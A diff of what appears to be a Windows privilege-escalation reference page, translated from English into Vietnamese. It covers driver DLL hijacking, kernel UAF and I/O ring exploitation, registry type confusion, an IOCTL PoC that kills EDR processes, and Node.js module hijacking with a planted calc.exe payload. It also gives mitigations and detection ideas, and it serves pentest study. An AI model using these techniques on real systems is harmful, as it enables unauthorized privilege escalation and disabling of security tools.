+Printer driver đã cài đặt có thể lưu support DLL trong `C:\ProgramData` và nạp chúng trong một print process có nhiều quyền hơn. Hãy rà soát ACL của thư mục driver và DLL cụ thể, bao gồm các thư mục cha và reparse point, ngay cả khi không thể enumeration printer bằng WMI. Với [vấn đề printer driver Ricoh CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1), đường dẫn được báo cáo là `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [bài công bố ban đầu](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) mô tả việc `PrintIsolationHost.exe` nạp DLL. ACL cho phép ghi chỉ là manh mối: hãy xác minh quyền ghi hiệu lực sau khi xét các mục từ chối, driver liên quan đã được cài đặt và có nạp file dưới một danh tính có đặc quyền hay không, cũng như driver đã cập nhật hoặc chương trình bảo mật của nhà cung cấp có khắc phục lỗi trong bản cài đặt hay chưa. Không suy luận có lỗ hổng chỉ dựa trên tên thư mục hoặc phiên bản driver.
 
-### Write Permissions
+### Quyền ghi
 
-Check if you can modify some config file to read some special file or if you can modify some binary that is going to be executed by an Administrator account (schedtasks).
+Kiểm tra xem bạn có thể sửa đổi một file cấu hình nào đó để đọc file đặc biệt, hoặc sửa đổi binary sẽ được thực thi bởi tài khoản Administrator (schedtasks) hay không.
 
-A way to find weak folder/files permissions in the system is doing:
+Có thể tìm các quyền yếu trên thư mục/file trong hệ thống bằng cách chạy:
 
 ```bash
 accesschk.exe /accepteula
@@ -1046,16 +1045,16 @@ Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Ac
 
 ### Notepad++ plugin autoload persistence/execution
 
-Notepad++ autoloads any plugin DLL under its `plugins` subfolders. If a writable portable/copy install is present, dropping a malicious plugin gives automatic code execution inside `notepad++.exe` on every launch (including from `DllMain` and plugin callbacks).
+Notepad++ tự động tải mọi plugin DLL trong các thư mục con `plugins`. Nếu có bản cài portable/bản sao có thể ghi được, việc thả một plugin độc hại vào đó sẽ tự động thực thi code bên trong `notepad++.exe` mỗi khi khởi chạy (bao gồm từ `DllMain` và các plugin callback).
 
 {{#ref}}
 notepad-plus-plus-plugin-autoload-persistence.md
 {{#endref}}
 
-### Run at startup
+### Chạy khi khởi động
 
-**Check if you can overwrite some registry or binary that is going to be executed by a different user.**\
-**Read** the **following page** to learn more about interesting **autoruns locations to escalate privileges**:
+**Kiểm tra xem bạn có thể ghi đè registry hoặc binary nào sẽ được người dùng khác thực thi hay không.**\
+**Đọc** **trang sau** để tìm hiểu thêm về các **vị trí autoruns đáng chú ý để leo thang đặc quyền**:
 
 
 {{#ref}}
@@ -1064,7 +1063,7 @@ privilege-escalation-with-autorun-binaries.md
 
 ### Drivers
 
-Look for possible **third party weird/vulnerable** drivers
+Tìm các driver **bên thứ ba bất thường/dễ bị khai thác** có thể có.
 
 ```bash
 driverquery
@@ -1072,7 +1071,7 @@ driverquery.exe /fo table
 driverquery /SI
 ```
 
-If a driver exposes an arbitrary kernel read/write primitive (common in poorly designed IOCTL handlers), you can escalate by stealing a SYSTEM token directly from kernel memory.<sup>[[13]](#references)</sup> See the step‑by‑step technique here:
+Nếu driver cung cấp primitive đọc/ghi kernel tùy ý (thường gặp trong các trình xử lý IOCTL được thiết kế kém), bạn có thể leo thang bằng cách đánh cắp trực tiếp token SYSTEM từ bộ nhớ kernel.<sup>[[13]](#references)</sup> Xem kỹ thuật từng bước tại đây:
 
 {{#ref}}
 arbitrary-kernel-rw-token-theft.md
@@ -1086,15 +1085,15 @@ windows-kernel-rootkits-and-dkom.md
 kernel-mode-file-access-check-bypass.md
 {{#endref}}
 
-Related Windows kernel-exploitation material:
+Tài liệu liên quan về khai thác kernel Windows:
 
-For a kernel-mode ring-buffer case with user-writable read/write registers, see the [USB MIDI looped-streaming variant](../../binary-exploitation/array-indexing.md#kernel-driver-variant-usb-midi-looped-streaming).
+Đối với trường hợp ring-buffer ở kernel mode có các thanh ghi đọc/ghi mà user có thể ghi, hãy xem biến thể [USB MIDI looped-streaming](../../binary-exploitation/array-indexing.md#kernel-driver-variant-usb-midi-looped-streaming).
 
 {{#ref}}
 ../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
 {{#endref}}
 
-For race-condition bugs where the vulnerable call opens an attacker-controlled Object Manager path, deliberately slowing the lookup (using max-length components or deep directory chains) can stretch the window from microseconds to tens of microseconds:
+Đối với các lỗi race condition mà lời gọi dễ bị tấn công mở một đường dẫn Object Manager do attacker kiểm soát, việc cố ý làm chậm quá trình tra cứu (bằng các thành phần có độ dài tối đa hoặc chuỗi thư mục sâu) có thể kéo dài khoảng thời gian từ microsecond lên hàng chục microsecond:
 
 {{#ref}}
 kernel-race-condition-object-manager-slowdown.md
@@ -1108,19 +1107,19 @@ kernel-race-condition-object-manager-slowdown.md
 ../../binary-exploitation/windows-kernel-exploitation/usb-midi-packet-size-pool-overflow.md
 {{#endref}}
 
-#### Cancel-safe queue UAFs, paged-pool disclosures, and I/O ring pivots
+#### UAF trong cancel-safe queue, lộ dữ liệu paged-pool và pivot I/O ring
 
-Some Windows kernel LPE chains can be built from two individually weak bugs: a **cancel-safe queue lifetime race** that frees a request/CBD while the queue lock is still held, and a **lock-release-before-copy** disclosure that leaks a freed paged-pool allocation during `RtlCopyToUser`.<sup>[[29]](#references)</sup>
+Một số chuỗi LPE trong kernel Windows có thể được xây dựng từ hai lỗi riêng lẻ vốn yếu: một **race về vòng đời của cancel-safe queue** làm giải phóng request/CBD khi queue lock vẫn đang được giữ, và một lỗi lộ dữ liệu **nhả lock trước khi copy** làm rò rỉ allocation paged-pool đã được giải phóng trong `RtlCopyToUser`.<sup>[[29]](#references)</sup>
 
-Audit and exploitation notes:
+Ghi chú về audit và khai thác:
 
-- **Free-under-lock + cancel afterwards**: look for a success path that does **Acquire -> CompleteRequest/free -> Release** while the cancel path does **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. If the success path reaches `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` before releasing the CBDQ/CSQ lock, a thread blocked in `NtCancelIoFileEx -> IopCsqCancelRoutine` can resume later and pass a freed `PFLT_CALLBACK_DATA` back into the driver's remove callback.
-- **Reclaim the freed queue object** with a same-sized, attacker-controlled paged-pool allocation. `NPFS` Data Queue Entries are useful because the payload and size are controllable and you can later probe them with pipe read/peek operations. If the freed object embeds list links, overwrite them with a **cyclic list of fake request nodes in user memory** so the driver repeatedly processes attacker-defined request structures instead of terminating at the original list head.
-- **Upgrade a predictable write**: if the fake request redirects a nested context pointer used by bookkeeping writes (timestamps / QPC / refcount-adjacent fields), you may get an **address-controlled but not value-controlled** kernel write. In that case, target a sprayed pool object's **length/size** field instead of a final code/data pointer, then enumerate the spray until the corrupted object yields an **out-of-bounds paged-pool read**.
-- **Raceable disclosure pattern**: any syscall that does `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` is a strong candidate. Reliability improves when the attacker can enlarge the copied buffer (for example by adding many list/resource entries that increase a serializer's final allocation size), because the longer copy widens the replacement window without necessarily crashing the machine.
-- **Pointer-rich refill targets**: Windows **I/O ring** registered-buffer arrays are excellent disclosure targets because their paged-pool size is attacker-controlled (`8 * regBufferCnt`) and each element is a kernel pointer to an `_IOP_MC_BUFFER_ENTRY`. Leak one of these arrays, recover the surrounding `IORING_OBJECT`, then corrupt **`RegBuffers`** and **`RegBuffersCount`** so subsequent I/O ring operations consume attacker-forged entries and provide arbitrary kernel read/write. If the only available write gives you a stable byte (for example from `KUSER_SHARED_DATA+0x14`), use **overlapping unaligned writes** to build a repeated-byte user pointer such as `0x0101010101010101`, map it with `VirtualAlloc`, and place the forged registered-buffer array there.<sup>[[30]](#references)</sup>
+- **Giải phóng khi đang giữ lock + cancel sau đó**: tìm đường xử lý thành công có dạng **Acquire -> CompleteRequest/free -> Release**, trong khi đường cancel có dạng **Acquire -> RemoveIo(con trỏ cũ) -> Release -> CompleteCanceledIo**. Nếu đường xử lý thành công đi tới `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` trước khi nhả lock CBDQ/CSQ, một thread bị chặn trong `NtCancelIoFileEx -> IopCsqCancelRoutine` có thể tiếp tục chạy sau đó và truyền một `PFLT_CALLBACK_DATA` đã được giải phóng vào callback remove của driver.
+- **Chiếm lại queue object đã được giải phóng** bằng một allocation paged-pool cùng kích thước do attacker kiểm soát. `NPFS` Data Queue Entries hữu ích vì payload và kích thước có thể kiểm soát, sau đó có thể thăm dò chúng bằng các thao tác đọc/peek pipe. Nếu object đã giải phóng chứa các list link, hãy ghi đè chúng bằng một **danh sách vòng lặp các node request giả trong user memory** để driver liên tục xử lý các cấu trúc request do attacker định nghĩa thay vì dừng ở list head ban đầu.
+- **Nâng cấp một lần ghi có thể dự đoán**: nếu request giả chuyển hướng một con trỏ context lồng nhau được dùng cho các lần ghi bookkeeping (timestamp / QPC / trường gần refcount), bạn có thể có được một lần ghi kernel **kiểm soát được địa chỉ nhưng không kiểm soát được giá trị**. Trong trường hợp đó, hãy nhắm vào trường **length/size** của một pool object được spray thay vì con trỏ code/data cuối cùng, rồi duyệt qua các object được spray cho đến khi object bị hỏng tạo ra **lần đọc paged-pool vượt phạm vi**.
+- **Mẫu lộ dữ liệu có thể race**: bất kỳ syscall nào có dạng `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` đều là ứng viên tiềm năng. Độ tin cậy tăng lên khi attacker có thể làm buffer được copy lớn hơn (ví dụ bằng cách thêm nhiều list/resource entry làm tăng kích thước allocation cuối cùng của serializer), vì copy lâu hơn sẽ mở rộng khoảng thời gian thay thế mà không nhất thiết làm crash máy.
+- **Đích refill có nhiều con trỏ**: các mảng registered-buffer của Windows **I/O ring** là đích lộ dữ liệu rất tốt vì kích thước paged-pool của chúng do attacker kiểm soát (`8 * regBufferCnt`) và mỗi phần tử là một con trỏ kernel tới `_IOP_MC_BUFFER_ENTRY`. Hãy leak một trong các mảng này, khôi phục `IORING_OBJECT` bao quanh, rồi làm hỏng **`RegBuffers`** và **`RegBuffersCount`** để các thao tác I/O ring tiếp theo sử dụng các entry do attacker giả mạo và cung cấp khả năng đọc/ghi kernel tùy ý. Nếu cách ghi duy nhất hiện có tạo ra một byte ổn định (ví dụ từ `KUSER_SHARED_DATA+0x14`), hãy dùng **các lần ghi không căn chỉnh chồng lấn** để tạo con trỏ user lặp byte như `0x0101010101010101`, ánh xạ nó bằng `VirtualAlloc`, rồi đặt mảng registered-buffer giả mạo tại đó.<sup>[[30]](#references)</sup>
 
-Useful debugging indicators:
+Các dấu hiệu hữu ích khi debug:
 
 ```text
 NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
@@ -1129,33 +1128,33 @@ RtlCopyToUser after releasing the object lock
 ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
 ```
 
-Once you obtain arbitrary kernel read/write from the corrupted I/O ring, steal a SYSTEM token using the standard post-primitive workflow:
+Sau khi lấy được arbitrary kernel read/write từ I/O ring bị lỗi, hãy đánh cắp SYSTEM token theo quy trình hậu khai thác tiêu chuẩn:
 
 {{#ref}}
 arbitrary-kernel-rw-token-theft.md
 {{#endref}}
 
-#### Registry hive memory corruption primitives
+#### Các primitive memory corruption trong Registry hive
 
-Modern hive vulnerabilities let you groom deterministic layouts, abuse writable HKLM/HKU descendants, and convert metadata corruption into kernel paged-pool overflows without a custom driver. Learn the full chain here:
+Các lỗ hổng hive hiện đại cho phép bạn sắp xếp bố cục bộ nhớ một cách xác định, khai thác các hậu duệ HKLM/HKU có thể ghi và biến lỗi hỏng metadata thành lỗi tràn kernel paged-pool mà không cần driver tùy chỉnh. Tìm hiểu toàn bộ chuỗi tại đây:
 
 {{#ref}}
 windows-registry-hive-exploitation.md
 {{#endref}}
 
-#### `RtlQueryRegistryValues` direct-mode type confusion from attacker-controlled paths
+#### Type confusion ở direct mode của `RtlQueryRegistryValues` từ các path do attacker kiểm soát
 
-Some drivers accept a registry path from userland, validate only that it is a sane UTF-16 string, and then call `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` with `RTL_QUERY_REGISTRY_DIRECT` into a stack scalar such as `int readValue`. If `RTL_QUERY_REGISTRY_TYPECHECK` is missing, `EntryContext` is interpreted according to the **actual** registry type, not the type the developer expected.
+Một số driver nhận path Registry từ userland, chỉ xác thực rằng đó là chuỗi UTF-16 hợp lệ, rồi gọi `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` với `RTL_QUERY_REGISTRY_DIRECT` trỏ vào một biến scalar trên stack, chẳng hạn `int readValue`. Nếu thiếu `RTL_QUERY_REGISTRY_TYPECHECK`, `EntryContext` sẽ được diễn giải theo kiểu Registry **thực tế**, chứ không phải kiểu mà developer mong đợi.
 
-This creates two useful primitives:<sup>[[24]](#references)[[25]](#references)</sup>
+Điều này tạo ra hai primitive hữu ích:<sup>[[24]](#references)[[25]](#references)</sup>
 
-- **Confused deputy / oracle**: a user-controlled absolute `\Registry\...` path lets the driver query attacker-chosen keys, leak existence through return codes/logs, and sometimes read values the caller could not access directly.
-- **Kernel memory corruption**: a scalar destination such as `&readValue` becomes type-confused as a `REG_QWORD`, `UNICODE_STRING`, or sized binary buffer depending on the registry value type.
+- **Confused deputy / oracle**: path tuyệt đối `\Registry\...` do người dùng kiểm soát cho phép driver truy vấn các key do attacker chọn, làm lộ sự tồn tại thông qua mã trả về/log và đôi khi đọc được các value mà caller không thể truy cập trực tiếp.
+- **Kernel memory corruption**: đích scalar như `&readValue` bị type confusion thành `REG_QWORD`, `UNICODE_STRING` hoặc buffer nhị phân có kích thước tùy theo kiểu Registry của value.
 
-Practical exploitation notes:
+Ghi chú khai thác thực tế:
 
-- **Windows 8+ mitigation**: if the query hits an **untrusted hive** with `RTL_QUERY_REGISTRY_DIRECT` but without `RTL_QUERY_REGISTRY_TYPECHECK`, kernel callers crash with `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. To keep exploitability, look for **attacker-writable keys inside trusted system hives** instead of staging values under `HKCU`.
-- **Trusted-hive staging**: use NtObjectManager to enumerate writable descendants of `\Registry\Machine`, and re-run the scan with a duplicated **low-integrity** token to find keys reachable from sandboxed contexts:<sup>[[26]](#references)</sup>
+- **Biện pháp giảm thiểu trên Windows 8 trở lên**: nếu truy vấn chạm tới một **untrusted hive** bằng `RTL_QUERY_REGISTRY_DIRECT` nhưng không có `RTL_QUERY_REGISTRY_TYPECHECK`, các caller trong kernel sẽ crash với `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Để duy trì khả năng khai thác, hãy tìm các key **có thể ghi bởi attacker bên trong trusted system hive** thay vì staging value dưới `HKCU`.
+- **Staging trong trusted hive**: dùng NtObjectManager để liệt kê các hậu duệ có thể ghi của `\Registry\Machine`, rồi chạy lại quá trình quét bằng token **low-integrity** đã được nhân bản để tìm các key có thể truy cập từ những ngữ cảnh sandbox:<sup>[[26]](#references)</sup>
 
 ```powershell
 Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
@@ -1163,25 +1162,25 @@ $token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
 Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
 ```
 
-- **`REG_QWORD`**: an 8-byte direct write into a 4-byte `int` corrupts adjacent stack data and can partially overwrite a nearby callback/function pointer.
-- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode expects `EntryContext` to point to a `UNICODE_STRING`. If the code first loads an attacker-controlled `REG_DWORD` into a stack scalar and then reuses that same buffer for a string read, the attacker controls `Length`/`MaximumLength` and partially influences the `Buffer` pointer, yielding a semi-controlled kernel write.
-- **`REG_BINARY`**: for large binary data, direct mode treats the first `LONG` at `EntryContext` as a signed buffer size. If a prior `REG_DWORD` read leaves a **negative** attacker-controlled value in the reused scalar, the next `REG_BINARY` query copies attacker bytes directly over adjacent stack slots, which is often the cleanest path to full callback-pointer overwrite.
+- **`REG_QWORD`**: ghi trực tiếp 8 byte vào `int` 4 byte sẽ làm hỏng dữ liệu stack liền kề và có thể ghi đè một phần callback/function pointer ở gần đó.
+- **`REG_SZ` / `REG_EXPAND_SZ`**: chế độ direct yêu cầu `EntryContext` trỏ đến một `UNICODE_STRING`. Nếu code trước tiên tải `REG_DWORD` do attacker kiểm soát vào một scalar trên stack rồi dùng lại cùng buffer đó để đọc string, attacker kiểm soát `Length`/`MaximumLength` và ảnh hưởng một phần đến con trỏ `Buffer`, tạo ra một kernel write được kiểm soát một phần.
+- **`REG_BINARY`**: với dữ liệu binary lớn, chế độ direct coi `LONG` đầu tiên tại `EntryContext` là kích thước buffer có dấu. Nếu lần đọc `REG_DWORD` trước đó để lại một giá trị **âm** do attacker kiểm soát trong scalar được dùng lại, truy vấn `REG_BINARY` tiếp theo sẽ sao chép byte do attacker cung cấp trực tiếp lên các slot stack liền kề, đây thường là cách dễ nhất để ghi đè hoàn toàn callback pointer.
 
-Strong hunting pattern: **heterogeneous registry reads into the same stack variable without reinitializing it**. Grep for `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, reused `EntryContext` pointers, and code paths where the first registry read controls whether a second read happens.
+Pattern hunting đáng chú ý: **các lần đọc registry không đồng nhất vào cùng một biến stack mà không khởi tạo lại biến đó**. Grep `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, các con trỏ `EntryContext` được dùng lại và các nhánh code trong đó lần đọc registry đầu tiên quyết định có thực hiện lần đọc thứ hai hay không.
 
-#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)
+#### Lạm dụng việc thiếu FILE_DEVICE_SECURE_OPEN trên device object (LPE + EDR kill)
 
-Some signed third‑party drivers create their device object with a strong SDDL via IoCreateDeviceSecure but forget to set FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics. Without this flag, the secure DACL is not enforced when the device is opened through a path containing an extra component, letting any unprivileged user obtain a handle by using a namespace path like:<sup>[[14]](#references)</sup>
+Một số driver bên thứ ba đã ký tạo device object bằng SDDL mạnh thông qua IoCreateDeviceSecure nhưng quên đặt FILE_DEVICE_SECURE_OPEN trong DeviceCharacteristics. Nếu thiếu flag này, secure DACL không được áp dụng khi mở device thông qua một đường dẫn có thêm thành phần, cho phép bất kỳ người dùng không có đặc quyền nào lấy được handle bằng cách sử dụng đường dẫn namespace như sau:<sup>[[14]](#references)</sup>
 
 - \\ .\\DeviceName\\anything
-- \\ .\\amsdk\\anyfile (from a real-world case)
+- \\ .\\amsdk\\anyfile (trong một trường hợp ngoài thực tế)
 
-Once a user can open the device, privileged IOCTLs exposed by the driver can be abused for LPE and tampering. Example capabilities observed in the wild:
-- Return full-access handles to arbitrary processes (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
-- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
-- Terminate arbitrary processes, including Protected Process/Light (PP/PPL), allowing AV/EDR kill from user land via kernel.
+Khi người dùng có thể mở device, có thể lạm dụng các IOCTL đặc quyền do driver cung cấp để thực hiện LPE và can thiệp. Các khả năng đã được ghi nhận ngoài thực tế:
+- Trả về handle toàn quyền đến các process tùy ý (đánh cắp token / tạo SYSTEM shell qua DuplicateTokenEx/CreateProcessAsUser).
+- Đọc/ghi raw disk không hạn chế (can thiệp offline, thủ thuật persistence lúc khởi động).
+- Terminate các process tùy ý, bao gồm Protected Process/Light (PP/PPL), cho phép kill AV/EDR từ user land thông qua kernel.
 
-Minimal PoC pattern (user mode):
+Pattern PoC tối thiểu (user mode):
 ```c
 // Example based on a vulnerable antimalware driver
 #define IOCTL_REGISTER_PROCESS  0x80002010
@@ -1194,62 +1193,62 @@ DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0)
 DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
 ```
 
-Mitigations for developers
-- Always set FILE_DEVICE_SECURE_OPEN when creating device objects intended to be restricted by a DACL.
-- Validate caller context for privileged operations. Add PP/PPL checks before allowing process termination or handle returns.
-- Constrain IOCTLs (access masks, METHOD_*, input validation) and consider brokered models instead of direct kernel privileges.
+Biện pháp giảm thiểu dành cho nhà phát triển
+- Luôn đặt FILE_DEVICE_SECURE_OPEN khi tạo các đối tượng thiết bị cần được giới hạn bằng DACL.
+- Xác thực ngữ cảnh của caller đối với các thao tác có đặc quyền. Thêm các bước kiểm tra PP/PPL trước khi cho phép chấm dứt tiến trình hoặc trả về handle.
+- Giới hạn IOCTL (access mask, METHOD_*, xác thực đầu vào) và cân nhắc dùng mô hình broker thay vì cấp trực tiếp đặc quyền kernel.
 
-Detection ideas for defenders
-- Monitor user-mode opens of suspicious device names (e.g., \\ .\\amsdk*) and specific IOCTL sequences indicative of abuse.
-- Enforce Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) and maintain your own allow/deny lists.
+Ý tưởng phát hiện dành cho người phòng thủ
+- Giám sát các lần mở từ user-mode đối với tên thiết bị đáng ngờ (ví dụ: \\ .\\amsdk*) và các chuỗi IOCTL cụ thể có dấu hiệu lạm dụng.
+- Áp dụng danh sách chặn driver dễ bị tấn công của Microsoft (HVCI/WDAC/Smart App Control) và duy trì danh sách cho phép/từ chối của riêng bạn.
 
 
 ## PATH DLL Hijacking
 
-If you have **write permissions inside a folder present on PATH** you could be able to hijack a DLL loaded by a process and **escalate privileges**.<sup>[[2]](#references)</sup>
+Nếu bạn có **quyền ghi trong một thư mục nằm trên PATH**, bạn có thể chiếm quyền DLL được một tiến trình tải và **leo thang đặc quyền**.<sup>[[2]](#references)</sup>
 
-Check permissions of all folders inside PATH:
+Kiểm tra quyền của tất cả thư mục trong PATH:
 
 ```bash
 for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
 ```
 
-For more information about how to abuse this check:
+Để biết thêm thông tin về cách lạm dụng kiểm tra này:
 
 
 {{#ref}}
 dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
 {{#endref}}
 
-## Node.js / Electron module resolution hijacking via `C:\node_modules`
+## Chiếm quyền phân giải module Node.js / Electron qua `C:\node_modules`
 
-This is a **Windows uncontrolled search path** variant that affects **Node.js** and **Electron** applications when they perform a bare import such as `require("foo")` and the expected module is **missing**.<sup>[[20]](#references)</sup>
+Đây là một biến thể **Windows uncontrolled search path**, ảnh hưởng đến các ứng dụng **Node.js** và **Electron** khi chúng thực hiện bare import như `require("foo")` và module dự kiến **không tồn tại**.<sup>[[20]](#references)</sup>
 
-Node resolves packages by walking up the directory tree and checking `node_modules` folders on each parent. On Windows, that walk can reach the drive root, so an application launched from `C:\Users\Administrator\project\app.js` may end up probing:<sup>[[21]](#references)</sup>
+Node phân giải các package bằng cách đi ngược lên cây thư mục và kiểm tra các thư mục `node_modules` ở mỗi thư mục cha. Trên Windows, quá trình này có thể đi đến thư mục gốc ổ đĩa, vì vậy ứng dụng được khởi chạy từ `C:\Users\Administrator\project\app.js` có thể sẽ tìm kiếm tại:<sup>[[21]](#references)</sup>
 
 1. `C:\Users\Administrator\project\node_modules\foo`
 2. `C:\Users\Administrator\node_modules\foo`
 3. `C:\Users\node_modules\foo`
 4. `C:\node_modules\foo`
 
-If a **low-privileged user** can create `C:\node_modules`, they can plant a malicious `foo.js` (or package folder) and wait for a **higher-privileged Node/Electron process** to resolve the missing dependency. The payload executes in the security context of the victim process, so this becomes **LPE** whenever the target runs as an administrator, from an elevated scheduled task/service wrapper, or from an auto-started privileged desktop app.
+Nếu **người dùng có quyền thấp** có thể tạo `C:\node_modules`, họ có thể đặt một file `foo.js` độc hại (hoặc thư mục package) và chờ một **tiến trình Node/Electron có quyền cao hơn** phân giải dependency bị thiếu. Payload chạy trong security context của tiến trình nạn nhân, vì vậy đây trở thành **LPE** khi mục tiêu chạy với quyền administrator, từ scheduled task/service wrapper được nâng quyền, hoặc từ ứng dụng desktop có quyền cao tự khởi động.
 
-This is especially common when:
+Điều này đặc biệt phổ biến khi:
 
-- a dependency is declared in `optionalDependencies`<sup>[[22]](#references)</sup>
-- a third-party library wraps `require("foo")` in `try/catch` and continues on failure
-- a package was removed from production builds, omitted during packaging, or failed to install
-- the vulnerable `require()` lives deep inside the dependency tree instead of in the main application code
+- một dependency được khai báo trong `optionalDependencies`<sup>[[22]](#references)</sup>
+- thư viện bên thứ ba bọc `require("foo")` trong `try/catch` và tiếp tục khi xảy ra lỗi
+- một package bị xóa khỏi bản build production, bị bỏ qua trong quá trình đóng gói hoặc cài đặt thất bại
+- lệnh `require()` dễ bị khai thác nằm sâu trong cây dependency thay vì trong mã ứng dụng chính
 
-### Hunting vulnerable targets
+### Tìm kiếm mục tiêu dễ bị tấn công
 
-Use **Procmon** to prove the resolution path:<sup>[[23]](#references)</sup>
+Dùng **Procmon** để xác minh đường dẫn phân giải:<sup>[[23]](#references)</sup>
 
-- Filter by `Process Name` = target executable (`node.exe`, the Electron app EXE, or the wrapper process)
-- Filter by `Path` `contains` `node_modules`
-- Focus on `NAME NOT FOUND` and the final successful open under `C:\node_modules`
+- Lọc theo `Process Name` = executable mục tiêu (`node.exe`, EXE của ứng dụng Electron hoặc tiến trình wrapper)
+- Lọc theo `Path` `contains` `node_modules`
+- Tập trung vào `NAME NOT FOUND` và lần mở thành công cuối cùng trong `C:\node_modules`
 
-Useful code-review patterns in unpacked `.asar` files or application sources:
+Các mẫu code-review hữu ích trong file `.asar` đã giải nén hoặc mã nguồn ứng dụng:
 
 ```bash
 rg -n 'require\\("[^./]' .
@@ -1258,16 +1257,16 @@ rg -n 'optionalDependencies' .
 rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
 ```
 
-### Exploitation
+### Khai thác
 
-1. Identify the **missing package name** from Procmon or source review.
-2. Create the root lookup directory if it does not already exist:
+1. Xác định **tên package bị thiếu** từ Procmon hoặc qua việc xem xét mã nguồn.
+2. Tạo thư mục tra cứu ở thư mục gốc nếu thư mục đó chưa tồn tại:
 
 ```powershell
 mkdir C:\node_modules
 ```
 
-3. Drop a module with the exact expected name:
+3. Đặt một module có đúng tên được mong đợi:
 
 ```javascript
 // C:\node_modules\foo.js
@@ -1275,21 +1274,21 @@ require("child_process").exec("calc.exe")
 module.exports = {}
 ```
 
-4. Trigger the victim application. If the application attempts `require("foo")` and the legitimate module is absent, Node may load `C:\node_modules\foo.js`.
+4. Kích hoạt ứng dụng mục tiêu. Nếu ứng dụng thử `require("foo")` và module hợp lệ không tồn tại, Node có thể tải `C:\node_modules\foo.js`.
 
-Real-world examples of missing optional modules that fit this pattern include `bluebird` and `utf-8-validate`, but the **technique** is the reusable part: find any **missing bare import** that a privileged Windows Node/Electron process will resolve.
+Các ví dụ thực tế về module tùy chọn bị thiếu phù hợp với mẫu này gồm `bluebird` và `utf-8-validate`, nhưng **kỹ thuật** mới là phần có thể tái sử dụng: tìm bất kỳ **bare import** nào bị thiếu mà tiến trình Node/Electron chạy với quyền cao trên Windows sẽ phân giải.
 
-### Detection and hardening ideas
+### Ý tưởng phát hiện và hardening
 
-- Alert when a user creates `C:\node_modules` or writes new `.js` files/packages there.
-- Hunt for high-integrity processes reading from `C:\node_modules\*`.
-- Package all runtime dependencies in production and audit `optionalDependencies` usage.
-- Review third-party code for silent `try { require("...") } catch {}` patterns.
-- Disable optional probes when the library supports it (for example, some `ws` deployments can avoid the legacy `utf-8-validate` probe with `WS_NO_UTF_8_VALIDATE=1`).
+- Cảnh báo khi người dùng tạo `C:\node_modules` hoặc ghi các tệp/gói `.js` mới vào đó.
+- Tìm kiếm các tiến trình có integrity level cao đọc từ `C:\node_modules\*`.
+- Đóng gói mọi runtime dependency trong môi trường production và kiểm tra việc sử dụng `optionalDependencies`.
+- Rà soát mã bên thứ ba để tìm các mẫu `try { require("...") } catch {}` bị bỏ qua âm thầm.
+- Tắt các probe tùy chọn nếu thư viện hỗ trợ (ví dụ: một số cấu hình triển khai `ws` có thể tránh probe `utf-8-validate` cũ bằng cách đặt `WS_NO_UTF_8_VALIDATE=1`).
 
-## Network
+## Mạng
 
-### Shares
+### Chia sẻ
 
 ```bash
 net view #Get a list of computers
@@ -1299,15 +1298,15 @@ net use x: \\computer\share #Mount the share locally
 net share #Check current shares
 ```
 
-### hosts file
+### tệp hosts
 
-Check for other known computers hardcoded on the hosts file
+Kiểm tra xem có máy tính đã biết nào khác được ghi cứng trong tệp hosts hay không.
 
 ```
 type C:\Windows\System32\drivers\etc\hosts
 ```
 
-### Network Interfaces & DNS
+### Giao diện mạng & DNS
 
 ```
 ipconfig /all
@@ -1315,46 +1314,46 @@ Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
 Get-DnsClientServerAddress -AddressFamily IPv4 | ft
 ```
 
-### Open Ports
+### Cổng đang mở
 
-Check for **restricted services** from the outside
+Kiểm tra các dịch vụ bị hạn chế từ bên ngoài
 
 ```bash
 netstat -ano #Opened ports?
 ```
 
-For a local listener, correlate its PID with the process owner, executable path, and any service or scheduled task that starts it. A remote-control service can give access as its desktop user only if its authentication and command controls permit it. A custom TCP application running as a higher-privileged account is a separate review target: the listener and binary path are passive leads, while an authenticated memory-corruption route requires analysis of that exact binary and its reachable input. If an exposed port appears to belong to a system process, compare it with [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) before attributing the backend service; a forwarding rule alone does not prove the destination is reachable or vulnerable.
